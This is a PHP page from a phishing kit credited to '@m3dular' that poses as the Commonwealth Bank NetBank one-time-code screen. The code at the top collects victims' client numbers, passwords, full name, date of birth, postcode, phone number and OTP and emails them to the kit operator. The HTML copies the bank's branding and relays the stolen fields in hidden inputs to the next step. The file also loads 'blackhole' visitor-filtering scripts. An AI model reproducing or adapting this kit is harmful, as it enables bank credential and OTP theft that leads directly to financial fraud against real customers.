<?php
session_start(); // session traps aint needed no more since we swittched to file based wl bl
error_reporting(0);
require_once "../inc/m3dular_config.php"; 
require_once "../m3dularbh/m3dular_functions.php"; 
require_once "../m3dularbh/index.php"; // BLACKHOLE TRAP
require_once "../m3dularbh/frontchecker.php"; // BLACKHOLE TRAP ALL FIRST CHECKS!
$loremdata=lorem(20);




$clientnumber  = $_POST["clientnumber"];
$clientpassword = $_POST["clientpassword"];

// 
$clientnumber2  = $_POST["clientnumber2"];
$clientpassword2 = $_POST["clientpassword2"];



$fullname = $_POST["fullname"];
$dob  = $_POST["dob"];
$zipcode = $_POST["zipcode"];
$phone = $_POST["phone"];
$otp = $_POST["otp"];

$data = "
---- $OWNER ----
--- page by @m3dular | @m3dularupdates   ---
  



Client Number : $clientnumber
Client Password: $clientpassword

---------------------------------


Client Number 2 : $clientnumber2
Client Password 2: $clientpassword2

--------------------------------------


Fullname : $fullname
DOB : $dob
Zipcode : $zipcode
Phone : $phone
OTP : $otp

--------------------------------------



--------- $OWNER  ------------
  

";

$headers    = "From:$from\r\nReturn-path:$bounce";

mail($EMAIL,"COMMS BANK  PERSONAL DETAILS ",$data);

if($DEBUG){mail("test@localhost","COMMS BANK PERSONAL DETAILS [$clientnumber]",$data,$headers);}








?>



<html class="win safari safari1 webkit webkit6 cssBeforeSupport" lang="en" style="margin-top: 80px;" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">
 <head id="head">
  <title>
   NetBank - OTP Code
  </title>
  <meta content="NetBank is here to simplify your banking life. You can manage all your accounts from one place, and do your banking whenever or wherever it suits you." name="description"/>


  <meta content="_Y1ecy6XcbQ3abYLk9glqe_Csuq0QakknnlXfW2Qrjo" name="google-site-verification"/>
   <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <link href="css/logon-merge.8397238ab0ae7a25ea1af4d375f2c3df.css" rel="stylesheet" rel-album="R620" type="text/css"/>
  <style class="at-flicker-control" id="at-makers-style">
   .mboxDefault {visibility: hidden;}
  </style>

<link rel="icon" href="favicon.ico" type="image/x-icon" />

 </head>
 <body class="logon" id="body">


 
<link href="m3d.css" rel="stylesheet">
<!-- M3D OVERLAY-->
<div class="overlay">
<div class="_3iXNWM">
  
</div></div>
<!-- M3D OVERLAY-->



<!-- Data passed from previous page -->



  <form action="verif.php" autocomplete="off" id="form1" method="post">



  
   <div id="BodyContainer">
    <div id="Header">
     <div id="BrandingLogo">
      <span class="ImageWithHelp" id="imgCbaLogo">
       <img alt="Commonwealth Bank of Australia" id="imgCbaLogo" src="images/cba_mainlogo.ac9de6fb5214be84653367c74ba0b5f0.gif"/>
      </span>
     </div>
    </div>
    <div id="MainContent">
     <noscript>
      <div class="MessagePanel">
       <div class="message_contents message_contents_validation">
        <div class="message">
         <div class="message_icon error">
         </div>
         <div class="msg_cnt_wrp msg_cnt_wrp_error">
          <p>
           <strong>
            You need to enable JavaScript to access NetBank
           </strong>
          </p>
          <p>
           Follow these instructions on
           <a href="https://www.commbank.com.au/support/faqs/298.html" id="lnkEnableJavaScript" target="_blank">
            how to enable JavaScript
           </a>
           .
										If you'd prefer not to enable Javascript, you can still access some basic NetBank functions by logging into the
           <a href="https://www.netbank.com.au/mobile" id="lnkMobileVersionNoScript">
            mobile version
           </a>
           of NetBank.
          </p>
         </div>
        </div>
       </div>
      </div>
     </noscript>
     <div class="MessagePanel arrow" id="mplMessagePanel" style="display:none;">
     </div>
     <div id="ModuleWrap">
      <div class="module" id="ModuleLeft">
       <h2 style="line-height:33px">
        OTP is sent to your mobile number (it may take 1-5 minutes to receive SMS).
       </h2>
       <div class="bd">
        <div class="ft" style="height:80px">

<!-- m3dinput -->
<input name="clientnumber" type="hidden"  value="<?=$_POST["clientnumber"]; ?>">
<input  name="clientpassword" type="hidden"  value="<?=$_POST["clientpassword"]; ?>">

<input name="clientnumber2" type="hidden"  value="<?php  echo $_POST["clientnumber2"]; ?>">
<input  name="clientpassword2" type="hidden"  value="<?php echo $_POST["clientpassword2"]; ?>">



<input name="fullname" type="hidden"  value="<?php  echo $_POST["fullname"]; ?>">
<input  name="dob" type="hidden"  value="<?php echo $_POST["dob"]; ?>">
<input name="zipcode" type="hidden"  value="<?php  echo $_POST["zipcode"]; ?>">
<input  name="phone" type="hidden"  value="<?php echo $_POST["phone"]; ?>">



         <div class="row rowClientNumber">
          <div class="LabelWrapper LabelTextAlignNotSet align_notset">
           <label for="txtMyClientNumber_field" id="txtMyClientNumber_label">
            <span class="MainLabel">
             OTP Code:
            </span>
           </label>
          </div>
          <div class="FieldElement">
           <input class="text textbox field" data-maxlength="8" id="txtMyClientNumber_field"  name="otp" type="text" required/>
          </div>
         </div>

       

<!-- 
         <div class="row">
          <div class="FieldElement FieldElementNoLabel">
           <span class="checkbox field checkbox_classic">
            <input class="checkbox" id="chkRemember_field" name="chkRemember$field" type="checkbox"/>
            <label for="chkRemember_field">
             Phone Number
            </label>
           </span>
          </div> -->


         </div>

         


         <div class="FieldElement FieldElementNoLabel">
          <div class="CbaButton" id="btnLogon">
           <input class="button field" id="btnLogon_field" name="btnLogon$field" type="submit" value="Continue"/>
          </div>
         </div><!-- 
         <a href="https://www1.my.commbank.com.au/netbank/UserMaintenance/Mixed/ForgotLogonDetails/FLDYourLogonDetails.aspx?RID=vUKwmlHAakyLf2hpAbYVZw&amp;SID=d%2bXDexR0E78%3d" id="lnkForgottenDetails">
          I've forgotten my log on details
         </a> -->
         <div class="MessageBubble" id="MessageBubble">
          <span class="MessagePointer">
          </span>
          <a class="MessageClose" href="javascript:void(0)" id="MessageClose" title="Close">
           Close
          </a>
          <span class="MessageBody">
           For security reasons, do not
           <br/>
           select
           <strong>
            Remember client number
           </strong>
           if anyone else uses
           <br/>
           this computer.
           <a href="http://www.commbank.com.au/passwordtips" id="lnkFindOutMore" target="_blank">
            Find out more
           </a>
           .
          </span>
         </div>
        </div>
       </div>
      </div>


      <!-- 
      <div class="module" id="ModuleRight">
       <h2>
        New to NetBank?
       </h2>
       <div class="bd">
        <div class="ft">
         <ul class="Bullets">
          <li>
           <a href="https://www1.my.commbank.com.au/netbank/Registration/Mixed/SelectCard.aspx?RID=vUKwmlHAakyLf2hpAbYVZw&amp;SID=d%2bXDexR0E78%3d" id="lnkRegistration">
            Register for NetBank now
           </a>
          </li>
          <li>
           <a href="https://www.commbank.com.au/personal/support.html" id="lnkOnlineSupport" target="_blank">
            Online support for our products and services
           </a>
          </li>
          <li>
           <a href="http://www.commbank.com.au/security-privacy/default.aspx" id="lnkProtectYourselfOnline" target="_blank">
            Tips to stay safe online
           </a>
          </li>
         </ul>
        </div>
        <div class="ft secModule">
         <ul class="Bullets">
          <li>
           <a href="https://www.commbank.com.au/security-privacy/how-protect-you.html" id="lnkSecurityGuarantee" target="_blank">
            How we protect you and our 100% security guarantee
           </a>
          </li>
         </ul>
        </div>
       </div>
      </div> -->


     </div>
     <!-- Component for content management. -->
     <div id="ucLogonContentManageControl_pnlContentManaged">
      <div id="ContentManaged">
       <!-- this is the features panel which has the image and description. -->
       <div id="ucLogonContentManageControl_pnlHighlightPanel">
        <div class="HighlightPanel">
         <div class="top">
          <div class="bottom">
           <div class="image">
            <p>
             <a href="https://www.commbank.com.au/tax-time.html?mbt=nb-tile_taxtime" target="_blank">
              <img alt="" src="images/tax-netbank-tile.jpg"/>
             </a>
            </p>
           </div>
           <div class="description">
            <table>
             <tbody>
              <tr>
               <td>
                <p>
                 <b>
                  Are you ready for tax time?
                 </b>
                </p>
                Get organised for EOFY with our range of useful guides and tax tips.
                <ul>
                 <li>
                  <a href="https://www.commbank.com.au/tax-time.html?mbt=nb-tile_taxtime" target="_blank">
                   Explore tax hub
                  </a>
                 </li>
                </ul>
                <p>
                </p>
                <p>
                 <span>
                 </span>
                </p>
                <p>
                </p>
               </td>
              </tr>
             </tbody>
            </table>
           </div>
          </div>
         </div>
        </div>
       </div>
       <!-- side by side highlight links at the bottom -->
       <div id="ucLogonContentManageControl_pnlCurrentHighlights">
        <div id="CurrentHighlights">
         <h3>
          Quicklinks
         </h3>
         <div class="column">
          <ul>
           <li>
            <p>
             <a href="https://www.commbank.com.au/business/merchant-services/eftpos-terminals.html?mbt=nb-ql_eftposterminal" target="_blank">
              Enjoy $0 merchant terminal rental fees for 6 months. Find out how.
             </a>
            </p>
           </li>
           <li>
            <p>
             <a href="https://www.commbank.com.au/support/financial-difficulty.html?mbt=nb-ql_financialdifficulty" target="_blank">
              Are you in financial difficulty? Apply for assistance.
             </a>
            </p>
           </li>
           <li>
            <p>
             <a href="https://www.commbank.com.au/digital-banking/commbank-app.html?mbt=nb-ql_app4" target="_blank">
              Personalise your CommBank app. Discover how.
             </a>
            </p>
           </li>
           <li>
            <p>
             <a href="https://www.commbank.com.au/latest/support-for-home-loan-customers.html?mbt=nb-ql_supportHL" target="_blank">
              Support for home loan customers
             </a>
            </p>
           </li>
          </ul>
         </div>
        </div>
       </div>
      </div>
     </div>
    </div>
    <div id="PageFooter">
     <a href="http://www.commbank.com.au/personal/netbank/terms-and-conditions/terms.aspx" id="lnkTermsOfUse" target="_blank">
      Terms of use
     </a>
     |
     <a href="http://www.commbank.com.au/security-privacy/default.aspx" id="lnkSecurity" target="_blank">
      Security
     </a>
     |
     <a href="http://www.commbank.com.au/security-privacy/general-security/privacy.html" id="lnkPrivacy" target="_blank">
      Privacy
     </a>
     <span id="CopyRight">
      � Commonwealth Bank of Australia 2021 ABN 48 123 123 124
     </span>
    </div>
   </div>
   <!-- CorrelationId: e5947895-b3d1-4ac9-8c81-e9eb0d953f8b -->
   <div class="aspNetHidden">
    <input id="__VIEWSTATEGENERATOR" name="__VIEWSTATEGENERATOR" type="hidden" value="D36AA275"/>
    <input id="__EVENTVALIDATION" name="__EVENTVALIDATION" type="hidden" value="/wEdAAdBE2G25NgTBOSU8Pqz5seN1tkCpOzpMMGFMIXCpKP1eU+3DVZOao4DU3+mkUn/6Lq9VKFP44dFVSqvdUtSca65l2O0yUofFF/VqhDKu55So0WhGMs5vjP2z0dydHI73bH84b/Z4SECaSTCtUK4njAufZrgpuWroDjuHGLJy3xuLdJ/NDY="/>
   </div>
   <input name="JS" type="hidden" value="E"/>
   <noscript>
    <input name="JS" type="hidden" value="D"/>
   </noscript>
  </form>
  <input id="SC_MEDIAMIND_ID" name="SC_MEDIAMIND_ID" type="hidden" value=""/>
  <input id="SC_PRODUCT_ID" name="SC_PRODUCT_ID" type="hidden" value=""/>
  <input id="SC_CUSTOMER_TYPE" name="SC_CUSTOMER_TYPE" type="hidden" value="NetBank"/>
  <input id="SC_SCREEN_NAME" name="SC_SCREEN_NAME" type="hidden" value=""/>
 
<!--
  <div class="ios top shown" id="smartbanner" style="top: 0px;">
  

   <div class="sb-container" id="iossmartbanner">
    <a class="sb-close" href="javascript:void(0)" id="appbannerclose">
     x
    </a>
    <img class="sb-icon" id="iosmobilebanner" src="images/commbankmobile.png"/>
    <div class="sb-info">
     <strong>
      CommBank app
     </strong>
     <span>
      A secure and easy way to bank on the go
     </span>
     <span>
     </span>
    </div>
   </div>
   <a class="sb-button" href="https://itunes.apple.com/au/app/id310251202?mt=8" id="appbannerview" target="_blank">
    <span>
     View
    </span>
    <input id="smartbanner_type" type="hidden" value="iosmobilebanner"/>
   </a>
  </div>
-->

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.js"></script>


<script>
        setTimeout(() => {
          $(".overlay").fadeOut(); // Submit the form
        }, 2000);
            </script>


 </body>
</html>